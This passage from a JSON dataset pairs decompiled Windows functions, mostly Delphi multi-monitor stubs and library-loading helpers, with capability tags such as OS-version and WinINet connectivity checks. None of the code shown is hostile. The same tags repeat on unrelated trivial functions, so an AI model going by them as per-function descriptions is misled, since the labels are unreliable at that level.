        "token_count": 1607
    },
    "0044e79c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0044e8ba)\n// WARNING: Removing unreachable block (ram,0x0044e8e5)\n// WARNING: Removing unreachable block (ram,0x0044e8e8)\n// WARNING: Removing unreachable block (ram,0x0044e928)\n// WARNING: Removing unreachable block (ram,0x0044e944)\n// WARNING: Removing unreachable block (ram,0x0044e948)\n// WARNING: Removing unreachable block (ram,0x0044e98e)\n// WARNING: Removing unreachable block (ram,0x0044e957)\n// WARNING: Removing unreachable block (ram,0x0044e99b)\n\nvoid __fastcall fcn.0044e79c(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    uStack76 = 0x44ea15;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1ch = 0;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.004054c0();\n        puVar1 = puStack72;\n    }\n    puStack72 = puVar1;\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (iVar3 == 0) {\n        fcn.0040dab4();\n        fcn.00404eb4();\n    }\n    else if (-1 < iVar3 + -1) {\n        do {\n            fcn.00419610();\n            fcn.00406f54();\n            fcn.00406f80();\n            cVar2 = (**(_pe_dos_header + 0x38))();\n            if (cVar2 != '\\0') {\n                var_1ch = var_1ch + 1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    if (var_1ch == 0) {\n        fcn.0040dab4();\n        fcn.00404eb4();\n    }\n    if (var_1ch == 1) {\n        fcn.0044e708(&stack0xfffffffc);\n    }\n    else if (*(in_EAX + 0xc) == 0) {\n        fcn.0044e708(&stack0xfffffffc);\n    }\n    else {\n        fcn.00406f80();\n        fcn.0044e708(&stack0xfffffffc);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x44ea1c;\n    uStack76 = 0x44e9e9;\n    fcn.00406f3c();\n    uStack76 = 0x44e9f1;\n    fcn.0040546c();\n    uStack76 = 0x44ea04;\n    fcn.00406024();\n    uStack76 = 0x44ea0c;\n    fcn.00406f3c();\n    uStack76 = 0x44ea14;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 843
    },
    "0044ea4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ea4c(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x44eb0b;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.004054c0();\n        puVar1 = puStack32;\n    }\n    puStack32 = puVar1;\n    if (*(*(in_EAX + 0x14) + 8) == 0) {\n        fcn.0040dab4();\n        fcn.00404eb4();\n    }\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            fcn.00419610();\n            fcn.00406f54();\n            fcn.00406f80();\n            cVar2 = (**(_pe_dos_header + 0x30))();\n            if (cVar2 != '\\0') {\n                (**(_pe_dos_header + 0x34))();\n                break;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x44eb12;\n    uStack36 = 0x44eb02;\n    fcn.00406f3c();\n    uStack36 = 0x44eb0a;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 436
    },
    "0044eb78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044eb78(uint arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t in_ECX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x44eb91;\n    fcn.004058ec();\n    uStack28 = 0x44ec22;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (in_ECX != 0) {\n        puStack24 = &stack0xfffffffc;\n        fcn.004054c0();\n    }\n    iVar1 = arg_ch;\n    if (iVar1 == 1) {\n        fcn.0044e79c();\n    }\n    else if (iVar1 == 2) {\n        fcn.0044e204();\n    }\n    else if (iVar1 == 3) {\n        fcn.0044e234();\n    }\n    else if (iVar1 == 8) {\n        fcn.0044e79c();\n    }\n    else {\n        fcn.0044e398(arg_8h, arg_ch);\n        in_stack_ffffffd8 = arg_8h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x44ec29;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 347
    },
    "0044dfa8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044dfa8(void)\n\n{\n    if (*0x4aae4c == 0) {\n        fcn.0044e058();\n        fcn.00406f54();\n    }\n    return;\n}\n",
        "token_count": 51
    },
    "0044dfd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0044dfd4(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    if (in_EAX != NULL) {\n        *in_EAX = 0;\n    }\n    fcn.0044dfa8();\n    uVar1 = fcn.00406f80();\n    return uVar1 & 0xffffff00 | *in_EAX != 0;\n}\n",
        "token_count": 95
    },
    "0044e234": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044e234(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x44e389;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x44e261;\n    piVar3 = fcn.00404610();\n    uStack52 = 0x44e33e;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar5 = *(*(in_EAX + 0x10) + 8);\n    puStack48 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar5 + -1) {\n        do {\n            puStack48 = puVar1;\n            iVar4 = fcn.00419610();\n            cVar2 = (**(**(iVar4 + 4) + 0x18))();\n            if (cVar2 != '\\0') {\n                (**(**(iVar4 + 4) + 0xc))();\n                (**(*piVar3 + 0x3c))();\n            }\n            iVar5 = iVar5 + -1;\n            puVar1 = puStack48;\n        } while (iVar5 != 0);\n    }\n    iVar5 = (**(*piVar3 + 0x14))();\n    if (iVar5 == 1) {\n        iVar5 = (**(*piVar3 + 0x18))();\n        (**(**(iVar5 + 4) + 0x1c))();\n    }\n    else {\n        iVar5 = (**(*piVar3 + 0x14))();\n        if ((0 < iVar5) && (*(in_EAX + 0xc) != 0)) {\n            (**(*piVar3 + 0x90))();\n            (**(**(in_EAX + 0xc) + 0x10))();\n            (**(*piVar3 + 0x18))();\n            fcn.00406f54();\n        }\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x44e345;\n    uStack52 = 0x44e33d;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 621
    },
    "0044e398": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044e398(uint arg_8h, uint arg_ch)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x44e43c;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar1 = &stack0xfffffffc;\n    if (in_ECX != 0) {\n        fcn.004054c0();\n        puVar1 = puStack36;\n    }\n    puStack36 = puVar1;\n    iVar4 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar3 = fcn.00419610();\n            fcn.00406f3c(*(iVar3 + 4));\n            cVar2 = fcn.0040f850();\n            if (cVar2 != '\\0') {\n                (**(_pe_dos_header + 0x40))(arg_8h, arg_ch);\n                break;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x44e443;\n    uStack40 = 0x44e43b;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 391
    },
    "0044ee38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044ee38(void)\n\n{\n    uint8_t in_AL;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x44ee4e;\n    fcn.004058ec();\n    uStack28 = 0x44eef5;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*(in_AL + 0x4aae78) == '\\0') {\n        if (*0x4aae74 == 0) {\n            iVar2 = 0;\n            puStack24 = &stack0xfffffffc;\n        }\n        else {\n            puStack24 = &stack0xfffffffc;\n            if (((in_AL == 0) && (puStack24 = &stack0xfffffffc,  *0x4aae80 == '\\0')) &&\n               (puStack24 = &stack0xfffffffc,  *0x4aae60 = fcn.0044ee38(),  *0x4aae80 == '\\0')) {\n                fcn.0040546c();\n            }\n            uVar1 = fcn.004058fc();\n            in_stack_ffffffd8 = *0x4aae74;\n            iVar2 = sub.kernel32.dll_GetProcAddress_1(*0x4aae74, uVar1);\n        }\n        if ((iVar2 != 0) && (in_AL != 0)) {\n            *0x4aae80 = '\\x01';\n        }\n        *(in_AL + 0x4aae78) = 1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    iStack32 = 0x44eefc;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 448
    },
    "0044ef1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044ef1c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (*0x4aae78 == '\\0') {\n        *0x4aae50 = fcn.0044ee38();\n        (**0x4aae50)(arg_8h);\n    }\n    else {\n        iVar1 = -1;\n        if (arg_8h - 0x4cU < 2) {\n            iVar1 = 0;\n        }\n        else if (arg_8h == 0x4e) {\n            arg_8h = 0;\n        }\n        else if (arg_8h == 0x4f) {\n            arg_8h = 1;\n        }\n        else if (arg_8h - 0x50U < 2) {\n            iVar1 = 1;\n        }\n        if (iVar1 == -1) {\n            sub.user32.dll_GetSystemMetrics(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "0044efa4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044efa4(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x4aae7a == '\\0') {\n        *0x4aae58 = fcn.0044ee38();\n        uVar1 = (**0x4aae58)(arg_8h, arg_ch);\n        return uVar1;\n    }\n    if ((arg_ch & 3) == 0) {\n        if (arg_8h[2] < 1) {\n            return 0;\n        }\n        if (arg_8h[3] < 1) {\n            return 0;\n        }\n        iVar2 = (**0x4aae50)(0);\n        if (iVar2 <= *arg_8h) {\n            return 0;\n        }\n        iVar2 = (**0x4aae50)(1);\n        if (iVar2 <= arg_8h[1]) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 241
    },
    "0044f034": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044f034(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_10h;\n    \n    if (*0x4aae79 == '\\0') {\n        *0x4aae54 = fcn.0044ee38();\n        uVar1 = (**0x4aae54)(arg_8h, arg_ch);\n    }\n    else if ((arg_ch & 3) == 0) {\n        iVar2 = sub.user32.dll_IsIconic(arg_8h);\n        if (iVar2 == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n        }\n        else {\n            sub.user32.dll_GetWindowPlacement(arg_8h, &var_2ch);\n        }\n        uVar1 = fcn.0044efa4(&var_10h, arg_ch);\n    }\n    else {\n        uVar1 = 0x12340042;\n    }\n    return uVar1;\n}\n",
        "token_count": 239
    },
    "0044f0cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044f0cc(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x4aae7b == '\\0') {\n        *0x4aae5c = fcn.0044ee38();\n        uVar1 = (**0x4aae5c)(arg_8h, arg_ch, arg_10h);\n        return uVar1;\n    }\n    if ((arg_10h & 3) == 0) {\n        if (arg_8h < 0) {\n            return 0;\n        }\n        iVar2 = (**0x4aae50)(0);\n        if (iVar2 <= arg_8h) {\n            return 0;\n        }\n        if (arg_ch < 0) {\n            return 0;\n        }\n        iVar2 = (**0x4aae50)(1);\n        if (iVar2 <= arg_ch) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 245
    },
    "0044f164": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044f164(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x4aae7c == '\\0') {\n        *0x4aae60 = fcn.0044ee38();\n        uVar1 = (**0x4aae60)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x4aae50)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x4aae50)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x44f230);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 403
    },
    "0044f238": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044f238(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x4aae7d == '\\0') {\n        *0x4aae64 = fcn.0044ee38();\n        uVar1 = (**0x4aae64)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x4aae50)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x4aae50)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x44f304);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 403
    },
    "0044f30c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044f30c(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x4aae7e == '\\0') {\n        *0x4aae68 = fcn.0044ee38();\n        uVar1 = (**0x4aae68)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x4aae50)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x4aae50)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x44f3d8);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 406
    },
    "0044f3e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044f3e0(int32_t arg_8h, int32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0x4aae7f == '\\0') {\n        *0x4aae6c = fcn.0044ee38();\n        uVar1 = (**0x4aae6c)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        uVar1 = 0;\n        if (arg_10h != NULL) {\n            var_1ch = 0;\n            var_18h = 0;\n            var_14h = (**0x4aae50)(0);\n            var_10h = (**0x4aae50)(1);\n            if (arg_8h == 0) {\n                if ((arg_ch != 0) && (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    return 1;\n                }\n            }\n            else {\n                var_ch = sub.gdi32.dll_GetClipBox(arg_8h, &var_2ch);\n                iVar2 = sub.gdi32.dll_GetDCOrgEx(arg_8h, &var_8h);\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                sub.user32.dll_OffsetRect(&var_1ch, -var_8h, -var_4h);\n                iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, &var_2ch);\n                if (((iVar2 == 0) || (arg_ch != 0)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    if (var_ch != 1) {\n                        return 0;\n                    }\n                    return 1;\n                }\n            }\n            uVar1 = (*arg_10h)(0x12340042, arg_8h, &var_1ch, arg_14h);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 563
    },
    "0044f5ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044f5ac(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    if (*0x4aaf50 == NULL) {\n        uVar1 = 0;\n        if (*0x4aaf44 != 0) {\n            *0x4aaf50 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44f624);\n            if (*0x4aaf50 != NULL) {\n                uVar1 = (**0x4aaf50)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x4aaf50)();\n    }\n    return uVar1;\n}\n",
        "token_count": 161
    },
    "0044f638": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044f638(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4aaf54 == NULL) {\n        uVar1 = 0x80004001;\n        if (*0x4aaf44 != 0) {\n            *0x4aaf54 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44f690);\n            if (*0x4aaf54 != NULL) {\n                uVar1 = (**0x4aaf54)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x4aaf54)();\n    }\n    return uVar1;\n}\n",
        "token_count": 147
    },
    "0044f6a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044f6a4(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4aaf58 == NULL) {\n        uVar1 = 0x80004001;\n        if (*0x4aaf44 != 0) {\n            *0x4aaf58 = sub.kernel32.dll_GetProcAddress_1(*0x4aaf44, 0x44f704);\n            if (*0x4aaf58 != NULL) {\n                uVar1 = (**0x4aaf58)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x4aaf58)();\n    }\n    return uVar1;\n}\n",
        "token_count": 149
    },
    "0044f71c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044f71c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = 0x44f729;\n    fcn.00422be4();\n    uStack12 = 0x44f8d3;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    if (0 < *0x4aaf48) {\n        *0x4aaf48 = *0x4aaf48 + -1;\n    }\n    puStack8 = &stack0xfffffffc;\n    if ((*0x4aaf44 != 0) && (puStack8 = &stack0xfffffffc,  *0x4aaf48 == 0)) {\n        iStack20 = *0x4aaf44;\n        puStack8 = &stack0xfffffffc;\n        sub.kernel32.dll_FreeLibrary_1();\n        *0x4aaf44 = 0;\n        *0x4aae84 = 0;\n        *0x4aae88 = 0;\n        *0x4aae8c = 0;\n        *0x4aae90 = 0;\n        *0x4aae94 = 0;\n        *0x4aae98 = 0;\n        *0x4aae9c = 0;\n        *0x4aaea0 = 0;\n        *0x4aaea4 = 0;\n        *0x4aaea8 = 0;\n        *0x4aaeac = 0;\n        *0x4aaeb0 = 0;\n        *0x4aaeb4 = 0;\n        *0x4aaeb8 = 0;\n        *0x4aaebc = 0;\n        *0x4aaec0 = 0;\n        *0x4aaec4 = 0;\n        *0x4aaec8 = 0;\n        *0x4aaecc = 0;\n        *0x4aaed0 = 0;\n        *0x4aaed4 = 0;\n        *0x4aaed8 = 0;\n        *0x4aaedc = 0;\n        *0x4aaee0 = 0;\n        *0x4aaee4 = 0;\n        *0x4aaee8 = 0;\n        *0x4aaeec = 0;\n        *0x4aaef0 = 0;\n        *0x4aaef4 = 0;\n        *0x4aaef8 = 0;\n        *0x4aaefc = 0;\n        *0x4aaf00 = 0;\n        *0x4aaf04 = 0;\n        *0x4aaf08 = 0;\n        *0x4aaf0c = 0;\n        *0x4aaf10 = 0;\n        *0x4aaf14 = 0;\n        *0x4aaf18 = 0;\n        *0x4aaf1c = 0;\n        *0x4aaf20 = 0;\n        *0x4aaf24 = 0;\n        *0x4aaf28 = 0;\n        *0x4aaf2c = 0;\n        *0x4aaf30 = 0;\n        *0x4aaf34 = 0;\n        *0x4aaf38 = 0;\n        *0x4aaf3c = 0;\n    }\n    *in_FS_OFFSET = iStack20;\n    uStack12 = 0x44f8da;\n    iStack16 = 0x44f8d2;\n    fcn.00422bec();\n    return;\n}\n",
        "token_count": 860
    },
    "0044f8dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
